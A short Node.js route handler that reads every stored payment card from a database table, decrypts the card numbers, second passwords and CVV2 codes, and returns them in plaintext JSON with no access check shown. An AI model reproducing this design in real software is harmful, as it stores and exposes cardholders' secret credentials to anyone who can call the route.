var CryptoJS = require('crypto-js');
var CONSTANTS = require('../constants');
var SECRET_KEY = CONSTANTS.SECRET_KEY;
module.exports = function (req, res, connection){
    connection.query("SELECT * FROM app_cards ORDER BY id DESC",function(error, result){
        // Decode each entry
        result.forEach(function(c){
            c.cardnumber = decrypt(c.cardnumber);
            c.secondpass = decrypt(c.secondpass);
            c.cvv2 = decrypt(c.cvv2);
        });
        return res.json(result);
    });
}

/* Decrypt function */
function decrypt(hashcode){
    return CryptoJS.AES.decrypt(hashcode.toString(), SECRET_KEY).toString(CryptoJS.enc.Utf8);
}